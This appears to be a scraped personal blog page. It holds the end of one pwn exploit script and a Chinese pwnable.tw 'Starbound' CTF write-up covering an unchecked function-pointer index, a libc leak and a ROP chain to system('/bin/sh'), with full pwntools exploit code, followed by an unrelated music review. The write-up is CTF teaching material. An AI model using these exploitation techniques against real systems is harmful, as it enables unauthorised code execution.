class="number">0xca0</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;passowrd&quot;</span>, <span class="number">0x10</span>*<span class="string">b&#x27;\0&#x27;</span>+<span class="number">0x30</span>*<span class="string">b&#x27;a&#x27;</span>+password+<span class="number">0x18</span>*<span class="string">b&#x27;a&#x27;</span> + pack(progaddr+my_read))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Copy :&quot;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ROP</span></span><br><span class="line">    start = <span class="number">0xb70</span></span><br><span class="line">    pop_rdi = <span class="number">0x10c3</span></span><br><span class="line">    payload = flat([</span><br><span class="line">        progaddr+pop_rdi,</span><br><span class="line">        progaddr+elf.got[<span class="string">&#x27;puts&#x27;</span>],</span><br><span class="line">        progaddr+elf.plt[<span class="string">&#x27;puts&#x27;</span>],</span><br><span class="line">        progaddr+start,</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">    io.sendafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;2&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">    io.send(pack(progaddr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+payload)</span><br><span class="line"></span><br><span class="line">    libcaddr = unpack(io.recvuntil(<span class="string">b&quot;\n&quot;</span>)[:-<span class="number">1</span>]+<span class="string">b&#x27;\0\0&#x27;</span>) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    success(<span class="string">&quot;libcaddr: &quot;</span>+<span class="built_in">hex</span>(libcaddr))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># bruteforce password again</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    password = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">0x100</span>):</span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">0x0a</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">            io.sendafter(<span class="string">b&quot;passowrd&quot;</span>, password + <span class="built_in">bytes</span>([ch]) + <span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;Success&quot;</span> <span class="keyword">in</span> io.recvline():</span><br><span class="line">                <span class="comment"># print(ch)</span></span><br><span class="line">                password += <span class="built_in">bytes</span>([ch])</span><br><span class="line">                io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(password) != i + <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;ERROR&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line">    success(<span class="string">&quot;password: &quot;</span>+<span class="built_in">repr</span>(password))</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;passowrd&quot;</span>, <span class="number">0x10</span>*<span class="string">b&#x27;\0&#x27;</span>+<span class="number">0x30</span>*<span class="string">b&#x27;a&#x27;</span>+password+<span class="number">0x18</span>*<span class="string">b&#x27;a&#x27;</span> + pack(progaddr+my_read))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Copy :&quot;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ROP</span></span><br><span class="line">    io.sendafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;2&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">    io.send(pack(progaddr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+pack(progaddr+pop_rdi)+pack(libcaddr+<span class="number">0x000000000018c177</span>)+pack(libcaddr+libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/Pwn/224d2c00b9a1.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis's Homepage">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Tech/Pwn/224d2c00b9a1.html" class="post-title-link" itemprop="url">【Pwn#0x13】pwnable.tw Starbound writeup</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-10-13 14:59:14" itemprop="dateCreated datePublished" datetime="2023-10-13T14:59:14+08:00">2023-10-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-01-11 16:30:39" itemprop="dateModified" datetime="2024-01-11T16:30:39+08:00">2024-01-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a>
                </span>
            </span>

          
            <span id="/Tech/Pwn/224d2c00b9a1.html" class="post-meta-item leancloud_visitors" data-flag-title="【Pwn#0x13】pwnable.tw Starbound writeup" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Tech/Pwn/224d2c00b9a1.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Tech/Pwn/224d2c00b9a1.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>本题 neta 了星界边境，实现了一个简单的二维探索游戏。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/mnt/c/Projects/ctf_archive/[pwnable.tw]Starbound/pwn&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8047000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>

<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>数组下标未检查导致的任意控制流劫持。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">256</span>]; <span class="comment">// [esp+10h] [ebp-104h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    alarm(<span class="number">0x3C</span>u);</span><br><span class="line">    menu_func_ptr();</span><br><span class="line">    <span class="keyword">if</span> ( !readn(nptr, <span class="number">256u</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = strtol(nptr, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ((<span class="type">void</span> (*)(<span class="type">void</span>))func_ptrs[v3])();          <span class="comment">// 数组index溢出！</span></span><br><span class="line">  &#125;</span><br><span class="line">  do_bye();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 main 函数中，有一个对于函数指针数组的调用，index 数据来自于用户输入经 strtol 转化成的数字。我们可以用 <code>cmd_set_name</code> 函数修改 data 段的数据，再让程序 call 我们控制的地址，达成 arbitary call。</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h3 id="ROP-方法"><a href="#ROP-方法" class="headerlink" title="ROP 方法"></a>ROP 方法</h3><p>有了任意调用，程序又没有开 PIE，接下来就是看看程序本体有哪些东西可以给我们来调用。<br>我在本体中，并没有找到 win 相关的函数，也没有找到导入的 system 符号，因此似乎没有简单的 ret2text 方法来完成一击必杀。</p>
<p>那就来打个 ROP 吧，我们可以直接用 main 函数 buffer 来存放 ROP 链，只要找一个类似于 <code>add esp, xxx; ret;</code> 的 gadget 即可。</p>
<p>使用这种方法，我们可以先用 <code>puts</code> 泄露 libc 基址，然后就能 <code>system(&quot;/bin/sh&quot;)</code> 了。具体利用见完整 EXP。<br>查 libc 版本用的是 <a target="_blank" rel="noopener" href="https://libc.rip/">libc-database</a>，俄罗斯那个（<a target="_blank" rel="noopener" href="https://libc.blukat.me/">libc.blukat.me</a>）查到的结果贼少，不知道为什么。</p>
<h3 id="路径穿越方法（存在利用条件限制）"><a href="#路径穿越方法（存在利用条件限制）" class="headerlink" title="路径穿越方法（存在利用条件限制）"></a>路径穿越方法（存在利用条件限制）</h3><p>ROP 方法是我不小心从网上看到的，唉我不应该上网查的。<br>不过我自己也想出了一个非常绝妙的利用，不需要用到 ROP！</p>
<p>我们已有的任意调用，其参数是固定好的，第一个参数是一个我们可控的字符串指针，第二个参数是 0。顺着这个思路，我们可以先看看程序本体中有哪些函数，其第一个参数是 <code>char*</code> 类型的。</p>
<p>首先，此类函数肯定是 printf 最常见也最好利用，我们可以用这种方法将任意调用宽展成任意读写，但程序开启了 FORTIFY 保护，里面甚至只有 <code>_printf_chk</code> 函数没有 <code>printf</code> 函数。两者的区别在于，后者其实是前者的一个 wrapper。<br>前者的第一个参数是一个安全等级，1 表示开启，0 表示关闭。当开启时，格式化字符串攻击将会被大大削弱，比如不能直接使用 <code>%n$d</code> 了，如果要用到这玩意，必须前面要有 <code>%1$d</code> <code>%2$d</code> … <code>%(n-1)$d</code> 这些。<br>因此，这条路走不通。</p>
<p>但我们就可以找到另外两个首个参数的—— <code>mkdir</code> 和 <code>open</code>。既然有 open，就可以想想是不是能 orw 把 flag 读出来。但是，程序的漏洞处，相邻的两次触发之间隔了许多个函数调用，这就不允许我们把 open 返回值暂时放在寄存器中，这里就很难进行下一步操作。</p>
<p>但是，我把整个 binary 都审了一边，发现了一个有趣的机制：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cmd_multiplayer_enable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">__pid_t</span> v0; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">socklen_t</span> len; <span class="comment">// [esp+2Ch] [ebp-80h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">addr</span>;</span> <span class="comment">// [esp+32h] [ebp-7Ah] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( fd != <span class="number">-1</span> )</span><br><span class="line">    close(fd);</span><br><span class="line">  addr.sa_family = <span class="number">1</span>;</span><br><span class="line">  fd = socket(<span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>);                         <span class="comment">// UDP</span></span><br><span class="line">  <span class="keyword">if</span> ( fd &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[Error] Fail to enable&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 <code>cmd_multiplayer_enable</code> 中，有对于一个全局变量 <code>fd</code> 的赋值。而我们知道，进程打开的第一个文件往往是接在 <code>stderr</code> 的后面，也就是 fd &#x3D;&#x3D; 3。<br>我们可以观察到，程序在使用 close 关闭 fd 之后，并没有清空 fd 的值，也就是这里依然是 3。实际调用这个函数，发现程序肯定可以走到关闭 fd 的代码。</p>
<p>我们查找 fd 的应用，可以找到这里：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cmd_multiplayer_recvmap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  </span><br><span class="line">  v5 = getpid();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ask your friends to share their coordinates!&quot;</span>);</span><br><span class="line">  v0 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(fd, buf, <span class="number">1u</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;[Error] Transmission error :(&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf[<span class="number">0</span>] == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    buf[<span class="number">0</span>] = rotate_shift_add_decrypt(buf[<span class="number">0</span>], &amp;v5);</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_chk(<span class="number">1</span>, <span class="string">&quot;[Info] Receiving (&quot;</span>);</span><br><span class="line">      v0 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(buf[<span class="number">0</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里程序将会尝试从 fd 中读取内容，每一个字节都使用 <code>rotate_shift_add_decrypt</code> 函数进行加密，然后打印出结果。</p>
<p>于是我们可以想到一条利用链：</p>
<ol>
<li>调用 <code>cmd_multiplayer_enable</code>，让 fd 被置为 3；</li>
<li>调用 <code>open</code> 函数打开 flag；</li>
<li>调用 <code>rotate_shift_add_decrypt</code>，读取加密后的 flag 并输出；</li>
<li>本地尝试暴力破解！</li>
</ol>
<p>但我们会遇到一个问题：虽然我们可以控制第一个参数这个字符串，但是其开头被限制了是一个数字，因为我们就是用这个数字当作数组下标来实现任意调用的。<br>为此，我想到了一种借用 <code>mkdir</code> 来加强 <code>open</code> 的方法：</p>
<ol>
<li>调用 <code>mkdir(&quot;-33\0&quot;)</code> 在当前目录创建名为 -33 的文件夹；</li>
<li>调用 <code>open(&quot;-33/../flag\0&quot;)</code> 打开任意目录下的 flag。</li>
</ol>
<p>在本地，这种方法是可行的。然而，远程环境中执行 binary 的路径是根目录，而进程并没有在根目录创建文件夹的权限，因此这种方法很遗憾地失效了 : (</p>
<h2 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">io = process([filename])</span><br><span class="line">io = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10202</span>)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    g = gdb.attach(io, <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        b *0x0804A65D</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="comment"># 0x08048e48 : add esp, 0x1c ; ret</span></span><br><span class="line">    add_esp_1c_ret = <span class="number">0x08048e48</span></span><br><span class="line"></span><br><span class="line">    payload = flat([</span><br><span class="line">        elf.symbols[<span class="string">&#x27;puts&#x27;</span>], elf.symbols[<span class="string">&#x27;_start&#x27;</span>], elf.got[<span class="string">&#x27;puts&#x27;</span>],</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;6&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;name&quot;</span>, pack(add_esp_1c_ret))</span><br><span class="line">    io.sendafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;-33\0dead&quot;</span>+payload)</span><br><span class="line"></span><br><span class="line">    mes = io.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:]</span><br><span class="line"></span><br><span class="line">    libc_base = unpack(mes,<span class="number">32</span>) - <span class="number">0x5fca0</span></span><br><span class="line">    log.info(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    system_addr = libc_base + <span class="number">0x3ada0</span></span><br><span class="line">    <span class="comment"># system_addr = libc_base + 0x49670 # printf</span></span><br><span class="line"></span><br><span class="line">    payload = flat([</span><br><span class="line">        system_addr, elf.symbols[<span class="string">&#x27;_start&#x27;</span>], <span class="number">0x080580D0</span>+<span class="number">0x4</span>,</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;6&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;name&quot;</span>, pack(add_esp_1c_ret)+<span class="string">b&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;-33\0dead&quot;</span>+payload)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="反思和总结"><a href="#反思和总结" class="headerlink" title="反思和总结"></a>反思和总结</h2><p><strong>函数数组和数组下标都是非常危险的东西——前者容易被劫持，后者容易超越边界。</strong><br>本漏洞修补十分简单，只需要加上一个检查就可以了。</p>
<p>从这道题目的利用中，我们可以发现：<strong>任意调用与 gadget 结合或许可以轻松达成栈迁移，允许我们进行 ROP 攻击。</strong></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Daily/ff41d015749c.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis's Homepage">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Daily/ff41d015749c.html" class="post-title-link" itemprop="url">【Music#0x01】纯个人向音乐鉴赏与推荐</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-09-17 16:05:26" itemprop="dateCreated datePublished" datetime="2023-09-17T16:05:26+08:00">2023-09-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-04-17 14:40:17" itemprop="dateModified" datetime="2024-04-17T14:40:17+08:00">2024-04-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Daily/" itemprop="url" rel="index"><span itemprop="name">Daily</span></a>
                </span>
            </span>

          
            <span id="/Daily/ff41d015749c.html" class="post-meta-item leancloud_visitors" data-flag-title="【Music#0x01】纯个人向音乐鉴赏与推荐" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Daily/ff41d015749c.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Daily/ff41d015749c.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>本人对音乐、乐理、电音制作等知识皆一窍不通，就是个臭打鼓的。因此本条博客是一个<strong>纯个人向</strong>音乐鉴赏与推荐！</p>
<h3 id="Glitched-Universe-削除"><a href="#Glitched-Universe-削除" class="headerlink" title="Glitched Universe - 削除"></a>Glitched Universe - 削除</h3><blockquote>
<p>链接：<a target="_blank" rel="noopener" href="https://music.163.com/song?id=2080462661&userid=127208986">网易云</a><br>评语：世界纷繁错乱，但令人心潮澎湃的心愿永远存在。</p>
</blockquote>
<p><strong>[0:00 - 0:37 Build Up]</strong></p>
<p>从空灵的女声开始，不断快速切入各种声部，包括富有动感的DnB鼓，极光般的弦乐，更具Glitch色彩的音效……然后在最后一小节提前爆发切入DROP！</p>
<p><strong>[0:37 - 0:55 DROP]</strong></p>
<p>宇宙，<strong>世界的绚烂</strong>。背景中心电图般爬升而又落下的像素音，坚定的女声与电声主旋律（这个lead我很喜欢），共同构成了这一副<strong>绚烂</strong>的图景！<br>（我真的很喜欢绚烂这个词）</p>
<p><strong>[0:55 - 1:00]</strong></p>
<p>DROP同样在最后一小节提前结束切入下段，但没有给人任何的失落感，而是让前后的衔接更加紧密，真是优秀的设计！这里是一个激烈的过渡段，用劲爆的节奏来为DROP收尾。</p>
<p><strong>[1:00 - 1:24]</strong></p>
<p>一个铺垫段，glitch噪音一直在耳边回响。电声乐器重复着变强又破碎（glitch音）的过程，好似恒星爆发又突然时光倒带。</p>
<p><strong>[1:24 - 2:07 Build UP]</strong></p>
<p>在刚才的基础上，似乎有了些规则的出现。glitch噪音不再是噪音，而是如同01的数据流一般；同时引入了些许钢琴旋律。</p>
<p>随后，又引入了心电图般爬升而又落下的像素音，以及隐隐约约渐强的DnB鼓。同时，lead变为了带一些glitch的像素音。情绪逐渐加强!</p>
<p><strong>[2:07 - 2:13]</strong></p>
<p>在我以为正要进入DROP时，旋律和节奏都突然停下了，取而代之的是一个持续的Glitch BASS。这时我仿佛来到了空旷无人的宇宙中，不见空间也不见时间。<br>随着BASS逐渐加强，流星般落下的音效出现，时间和空间逐渐回归。然后，在最后一小节提前切入——</p>
<p><strong>[2:13 - 2:51 DROP]</strong></p>
<p>整首曲子情感的爆发，重复了两遍的DROP让人感动。<br>再一次见证<strong>世界的绚丽</strong>。</p>
<p><strong>[2:51 - 3:00]</strong></p>
<p>再次以激烈的节奏与电音为整首曲子收尾，让人意犹未尽，仍想再度踏上这次旅程。</p>
<h3 id="Holy-Night-Silent-Night-Dachs"><a href="#Holy-Night-Silent-Night-Dachs" class="headerlink" title="Holy Night, Silent Night - Dachs"></a>Holy Night, Silent Night - Dachs</h3><blockquote>
<p>链接：<a target="_blank" rel="noopener" href="https://music.163.com/song?id=526904317&userid=127208986">网易云</a><br>风格：trance<br>评语：神一般的间奏，让人感动，和专辑封面一样美哭</p>
</blockquote>
<p><strong>[0:00 - 2:30]</strong></p>
<p>开头仿佛是令人安心的冬夜，快要过圣诞了。抬头便可看到繁星流转于夜空。</p>
<p><strong>[2:30 - 3:15 breakdown]</strong></p>
<p>静谧的夜。情绪慢慢变得柔和，音乐逐渐无声……<br>柔和的钢琴响起，伴随着弦乐，仿佛回忆往昔时光，有着淡淡的伤感。</p>
<p><strong>[3:15 - 3:56]</strong></p>
<p>有力的钢琴伴随着诸多交响乐器逐渐加强，我们从回忆走出，镜头切换到身前，我们仿佛看到了奇迹——或是久别重逢、或者找回信仰。</p>
